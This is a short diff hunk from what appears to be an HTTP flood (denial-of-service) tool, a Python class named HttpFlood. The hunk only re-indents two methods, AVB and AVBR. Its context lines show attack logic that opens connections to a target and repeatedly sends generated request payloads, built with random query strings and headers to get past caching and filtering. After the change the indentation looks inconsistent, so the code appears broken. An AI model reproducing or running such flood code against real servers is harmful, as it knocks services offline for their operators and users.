@@ -928,8 +928,8 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
                 if time() > ts + 220: break
         Tools.safe_close(s)
-
-  def AVB(self):
+        
+      def AVB(self):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -937,7 +937,7 @@ class HttpFlood(Thread):
                 sleep(6)
                 Tools.send(s, payload)
         Tools.safe_close(s)
-  def AVBR(self):
+    def AVBR(self):
         payload = str.encode("%s %ss=%s HTTP/1.1\r\n" % (self._req_type,self._target.raw_path_qs,ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
                              self.randHeadercontent +
